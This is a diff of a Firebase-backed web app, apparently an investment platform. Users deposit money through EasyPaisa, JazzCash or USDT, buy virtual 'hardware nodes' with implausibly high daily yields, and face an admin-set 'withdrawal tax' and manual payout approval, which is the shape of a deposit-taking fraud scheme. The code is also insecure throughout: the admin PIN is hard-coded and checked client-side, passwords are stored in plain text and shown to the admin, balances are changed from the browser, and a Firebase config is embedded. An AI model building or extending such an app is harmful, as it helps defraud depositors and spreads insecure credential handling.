@@ -15,7 +15,7 @@
         .active-screen { display: block; animation: slideUp 0.4s ease; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(255,255,255,0.9); backdrop-filter: blur(10px); border-top: 1px solid #e2e8f0; display: flex; justify-content: space-around; padding: 15px 5px; z-index: 1000; }
-        .nav-item { color: #94a3b8; font-size: 8px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 4px; }
+        .nav-item { color: #94a3b8; font-size: 8px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; }
         .nav-item.active { color: var(--gold); }
         input { border: 1px solid #e2e8f0 !important; font-size: 14px !important; }
     </style>
@@ -48,7 +48,7 @@
                 <p class="text-[8px] text-slate-500 font-bold uppercase tracking-widest mb-1">Current Balance</p>
                 <h1 id="b-main" class="text-5xl font-black tracking-tighter mb-8">$0.00</h1>
                 <div class="grid grid-cols-2 gap-4 border-t border-white/10 pt-6">
-                    <div><p class="text-[7px] text-slate-500 font-bold uppercase">Today Profit</p><p id="b-daily" class="text-lg font-black text-green-400">+$0.00</p></div>
+                    <div><p class="text-[7px] text-slate-500 font-bold uppercase">Daily Yield</p><p id="b-daily" class="text-lg font-black text-green-400">+$0.00</p></div>
                     <div class="text-right"><p class="text-[7px] text-slate-500 font-bold uppercase">Total Earned</p><p id="b-total" class="text-lg font-black text-[#D4AF37]">$0.00</p></div>
                 </div>
             </div>
@@ -64,23 +64,18 @@
 
         <div id="page-admin" class="screen px-4 pt-6 pb-24">
             <h2 class="text-xl font-black mb-6 text-red-600 uppercase">Command Center</h2>
-            
             <div class="premium-card p-5 mb-6 bg-slate-900 text-white">
-                <h3 class="text-[10px] font-bold text-slate-400 uppercase mb-4">Update Wallets & Tax</h3>
+                <h3 class="text-[10px] font-bold text-slate-400 uppercase mb-4">Master Config</h3>
                 <input type="text" id="adm-ep" placeholder="EasyPaisa No" class="w-full p-3 rounded-xl text-black mb-2">
                 <input type="text" id="adm-jc" placeholder="JazzCash No" class="w-full p-3 rounded-xl text-black mb-2">
                 <input type="text" id="adm-usdt" placeholder="USDT Address" class="w-full p-3 rounded-xl text-black mb-2">
-                <input type="number" id="adm-tax" placeholder="Tax %" class="w-full p-3 rounded-xl text-black mb-4">
-                <button onclick="saveAdminSettings()" class="w-full btn-gold py-3 text-xs">Save Master Config</button>
+                <input type="number" id="adm-tax" placeholder="Withdrawal Tax %" class="w-full p-3 rounded-xl text-black mb-4">
+                <button onclick="saveAdminSettings()" class="w-full btn-gold py-3 text-xs">Update Settings</button>
             </div>
-
-            <div class="premium-card p-5 mb-6">
-                <h3 class="text-[10px] font-black uppercase mb-4">User Master List</h3>
-                <div id="adm-user-list" class="space-y-2 max-h-60 overflow-y-auto border-t pt-3"></div>
-            </div>
-
             <h3 class="text-[10px] font-bold uppercase mb-3 text-slate-400">Pending Approvals</h3>
-            <div id="adm-pending-list" class="space-y-3"></div>
+            <div id="adm-pending-list" class="space-y-3 mb-6"></div>
+            <h3 class="text-[10px] font-black uppercase mb-4">User Registry</h3>
+            <div id="adm-user-list" class="space-y-2 max-h-60 overflow-y-auto border-t pt-3"></div>
         </div>
 
         <nav class="nav-bar">
@@ -93,7 +88,7 @@
     </div>
 
     <div id="modal-dep" class="fixed inset-0 bg-white z-[2000] p-8 hidden overflow-y-auto">
-        <div class="flex justify-between items-center mb-8"><h2 class="font-black text-xl">DEPOSIT</h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-xmark"></i></div>
+        <div class="flex justify-between items-center mb-8"><h2 class="font-black text-xl">DEPOSIT</h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-xmark cursor-pointer"></i></div>
         <div class="grid grid-cols-3 gap-2 mb-6">
             <button onclick="showWay('EP')" class="border p-3 rounded-xl text-[9px] font-bold">EasyPaisa</button>
             <button onclick="showWay('JC')" class="border p-3 rounded-xl text-[9px] font-bold">JazzCash</button>
@@ -102,13 +97,14 @@
         <div id="dep-info" class="bg-slate-100 p-6 rounded-2xl text-center mb-8 hidden"><p id="dep-addr" class="text-xs font-black break-all"></p></div>
         <input type="number" id="dep-amt" placeholder="Amount ($)" class="w-full p-4 border rounded-2xl mb-4">
         <input type="text" id="dep-txid" placeholder="Transaction ID" class="w-full p-4 border rounded-2xl mb-8">
-        <button onclick="handleFinance('Deposit')" class="w-full btn-gold py-4">SUBMIT</button>
+        <button onclick="handleFinance('Deposit')" class="w-full btn-gold py-4">SUBMIT DEPOSIT</button>
     </div>
 
     <div id="modal-wd" class="fixed inset-0 bg-white z-[2000] p-8 hidden">
-        <div class="flex justify-between items-center mb-8"><h2 class="font-black text-xl">WITHDRAW</h2><i onclick="closeModal('modal-wd')" class="fa-solid fa-xmark"></i></div>
+        <div class="flex justify-between items-center mb-8"><h2 class="font-black text-xl">WITHDRAW</h2><i onclick="closeModal('modal-wd')" class="fa-solid fa-xmark cursor-pointer"></i></div>
         <input type="number" id="wd-amt" placeholder="Amount ($)" class="w-full p-4 border rounded-2xl mb-4">
-        <input type="text" id="wd-addr" placeholder="Account Number" class="w-full p-4 border rounded-2xl mb-8">
+        <input type="text" id="wd-addr" placeholder="Account Number / Wallet" class="w-full p-4 border rounded-2xl mb-8">
+        <p class="text-[9px] text-slate-400 mb-4 text-center">Note: System tax will be applied to the total balance.</p>
         <button onclick="handleFinance('Withdraw')" class="w-full btn-gold py-4">REQUEST PAYOUT</button>
     </div>
 
@@ -116,33 +112,46 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, getDocs, deleteDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
-        const app = initializeApp(firebaseConfig); const db = getFirestore(app);
+        // Firebase Configuration
+        const firebaseConfig = { 
+            apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", 
+            authDomain: "home-94d45.firebaseapp.com", 
+            projectId: "home-94d45", 
+            appId: "1:964390949419:web:589840cb91b7e42ecd506e" 
+        };
+        const app = initializeApp(firebaseConfig); 
+        const db = getFirestore(app);
 
         let user = localStorage.getItem('nova_session');
-        let mode = 'login'; let admClicks = 0;
+        let mode = 'login'; 
+        let admClicks = 0;
         let sys = { ep: "Not Set", jc: "Not Set", usdt: "Not Set", tax: 0 };
 
+        // Node Catalog
         const nodes = [{id:1, n:"Micro Node", c:10, y:0.9}];
         for(let i=2; i<=21; i++) nodes.push({id:i, n:`Industrial Node V${i}`, c:20+(i*50), y:2+(i*6)});
 
+        // Admin Access Logic
         document.getElementById('logo-main').onclick = () => {
             admClicks++;
             if(admClicks >= 5) {
-                if(prompt("Enter Admin Pin:") === "nov786") {
+                if(prompt("Enter Master PIN:") === "nov786") {
                     document.getElementById('nav-admin-btn').style.display = "flex";
                     loadMasterUsers();
-                    alert("Admin Access Granted!");
+                    alert("Master Access Granted!");
                 }
                 admClicks = 0;
             }
         };
 
+        // Auth Handler
         window.handleAuth = async () => {
             const id = document.getElementById('u-id').value.toLowerCase().trim();
             const pw = document.getElementById('u-pw').value;
             if(!id || !pw) return alert("Fields required");
-            const uRef = doc(db, "users", id); const snap = await getDoc(uRef);
+            const uRef = doc(db, "users", id); 
+            const snap = await getDoc(uRef);
+            
             if(mode === 'login') {
                 if(snap.exists() && snap.data().password === pw) {
                     localStorage.setItem('nova_session', id); location.reload();
@@ -154,28 +163,48 @@
             }
         };
 
-        async function loadMasterUsers() {
-            const q = await getDocs(collection(db, "users"));
-            const box = document.getElementById('adm-user-list');
-            box.innerHTML = "";
-            q.forEach(uDoc => {
-                const u = uDoc.data();
-                box.innerHTML += `<div class="p-3 border rounded-xl flex justify-between bg-slate-50 text-[10px]">
-                    <div><b>@${uDoc.id}</b><br>PW: ${u.password}</div>
-                    <div class="text-right">Bal: $${(u.balance || 0).toFixed(2)}<br><span class="text-red-600" onclick="delUser('${uDoc.id}')">Delete</span></div>
-                </div>`;
-            });
-        }
+        // Finance Handler (With Security & Balance Check)
+        window.handleFinance = async (type) => {
+            const amt = parseFloat(document.getElementById(type === 'Deposit' ? 'dep-amt' : 'wd-amt').value);
+            const ref = document.getElementById(type === 'Deposit' ? 'dep-txid' : 'wd-addr').value;
+            
+            if(!amt || amt <= 0 || !ref) return alert("Please fill all fields correctly");
 
-        window.saveAdminSettings = async () => {
-            const up = { ep: document.getElementById('adm-ep').value, jc: document.getElementById('adm-jc').value, usdt: document.getElementById('adm-usdt').value, tax: parseFloat(document.getElementById('adm-tax').value) || 0 };
-            await setDoc(doc(db, "config", "master"), up, { merge: true });
-            alert("Settings Updated in Database!");
+            const uRef = doc(db, "users", user);
+            const snap = await getDoc(uRef);
+            const currentBal = snap.data().balance || 0;
+
+            if(type === 'Withdraw') {
+                const tax = amt * (sys.tax / 100);
+                if(currentBal < (amt + tax)) return alert(`Insufficient funds. Total needed: $${(amt + tax).toFixed(2)} (Tax included)`);
+            }
+
+            await addDoc(collection(db, "logs"), { user: user, type, amount: amt, ref, status: 'Pending', time: Date.now() });
+            alert("Request submitted for approval!"); 
+            closeModal(type === 'Deposit' ? 'modal-dep' : 'modal-wd');
         };
 
+        // Admin Approval Logic
+        window.approve = async (lid, uid, amt, type) => {
+            const uRef = doc(db, "users", uid); 
+            const s = await getDoc(uRef);
+            const currentBal = s.data().balance || 0;
+
+            if(type === 'Deposit') {
+                await updateDoc(uRef, { balance: currentBal + amt });
+            } else if(type === 'Withdraw') {
+                const finalDeduct = amt + (amt * (sys.tax / 100));
+                await updateDoc(uRef, { balance: currentBal - finalDeduct });
+            }
+            await updateDoc(doc(db, "logs", lid), { status: 'Approved' });
+            alert("Transaction Confirmed!");
+        };
+
+        // System Initialization
         function initApp(id) {
             document.getElementById('auth-screen').style.display = 'none';
             document.getElementById('app').classList.remove('hidden');
+            
             onSnapshot(doc(db, "users", id), d => {
                 const u = d.data(); if(!u) return;
                 document.getElementById('user-display').innerText = `@${id}`;
@@ -184,10 +213,22 @@
                 document.getElementById('b-total').innerText = `$${(u.total_profit || 0).toFixed(2)}`;
                 renderNodes(u.active_nodes || []);
             });
-            onSnapshot(doc(db, "config", "master"), d => { if(d.exists()) sys = d.data(); });
-            loadAdminReqs(); loadUserLogs(id);
+
+            onSnapshot(doc(db, "config", "master"), d => { 
+                if(d.exists()) {
+                    sys = d.data();
+                    document.getElementById('adm-ep').value = sys.ep || "";
+                    document.getElementById('adm-jc').value = sys.jc || "";
+                    document.getElementById('adm-usdt').value = sys.usdt || "";
+                    document.getElementById('adm-tax').value = sys.tax || 0;
+                }
+            });
+
+            loadAdminReqs(); 
+            loadUserLogs(id);
         }
 
+        // Render Hardware Nodes
         function renderNodes(active) {
             const grid = document.getElementById('nodes-grid'); grid.innerHTML = "";
             nodes.forEach(n => {
@@ -200,24 +241,35 @@
         }
 
         window.buyNode = async (id, cost, y) => {
-            const uRef = doc(db, "users", user); const snap = await getDoc(uRef);
+            const uRef = doc(db, "users", user); 
+            const snap = await getDoc(uRef);
             if(snap.data().balance < cost) return alert("Insufficient Balance");
-            await updateDoc(uRef, { balance: snap.data().balance - cost, active_nodes: [...(snap.data().active_nodes || []), { nodeId: id, yield: y }], daily: (snap.data().daily || 0) + y });
+            await updateDoc(uRef, { 
+                balance: snap.data().balance - cost, 
+                active_nodes: [...(snap.data().active_nodes || []), { nodeId: id, yield: y }], 
+                daily: (snap.data().daily || 0) + y 
+            });
             alert("Hardware Activated!");
         };
 
+        // Utility Functions
         window.showWay = (t) => {
             document.getElementById('dep-info').classList.remove('hidden');
             document.getElementById('dep-addr').innerText = t + ": " + (sys[t.toLowerCase()] || "Contact Admin");
         };
 
-        window.handleFinance = async (type) => {
-            const amt = parseFloat(document.getElementById(type === 'Deposit' ? 'dep-amt' : 'wd-amt').value);
-            const ref = document.getElementById(type === 'Deposit' ? 'dep-txid' : 'wd-addr').value;
-            if(!amt || !ref) return alert("Fill all fields");
-            await addDoc(collection(db, "logs"), { user: user, type, amount: amt, ref, status: 'Pending', time: Date.now() });
-            alert("Request Sent!"); closeModal(type === 'Deposit' ? 'modal-dep' : 'modal-wd');
-        };
+        async function loadMasterUsers() {
+            const q = await getDocs(collection(db, "users"));
+            const box = document.getElementById('adm-user-list');
+            box.innerHTML = "";
+            q.forEach(uDoc => {
+                const u = uDoc.data();
+                box.innerHTML += `<div class="p-3 border rounded-xl flex justify-between bg-slate-50 text-[10px]">
+                    <div><b>@${uDoc.id}</b><br>PW: ${u.password}</div>
+                    <div class="text-right">Bal: $${(u.balance || 0).toFixed(2)}<br><span class="text-red-600 cursor-pointer" onclick="delUser('${uDoc.id}')">Delete</span></div>
+                </div>`;
+            });
+        }
 
         async function loadAdminReqs() {
             onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
@@ -232,17 +284,6 @@
             });
         }
 
-        window.approve = async (lid, uid, amt, type) => {
-            const uRef = doc(db, "users", uid); const s = await getDoc(uRef);
-            if(type === 'Deposit') await updateDoc(uRef, { balance: (s.data().balance || 0) + amt });
-            if(type === 'Withdraw') {
-                const finalAmt = amt + (amt * (sys.tax / 100));
-                await updateDoc(uRef, { balance: (s.data().balance || 0) - finalAmt });
-            }
-            await updateDoc(doc(db, "logs", lid), { status: 'Approved' });
-            alert("Done!");
-        };
-
         function loadUserLogs(id) {
             onSnapshot(query(collection(db, "logs"), where("user", "==", id)), s => {
                 const list = document.getElementById('logs-list'); list.innerHTML = "";
@@ -255,6 +296,12 @@
                 });
             });
         }
+
+        window.saveAdminSettings = async () => {
+            const up = { ep: document.getElementById('adm-ep').value, jc: document.getElementById('adm-jc').value, usdt: document.getElementById('adm-usdt').value, tax: parseFloat(document.getElementById('adm-tax').value) || 0 };
+            await setDoc(doc(db, "config", "master"), up, { merge: true });
+            alert("Master Settings Updated!");
+        };
 
         window.delUser = async (id) => { if(confirm(`Delete @${id}?`)) await deleteDoc(doc(db, "users", id)); loadMasterUsers(); };
         window.nav = (id, el) => { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen')); document.getElementById(id).classList.add('active-screen'); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active'); };
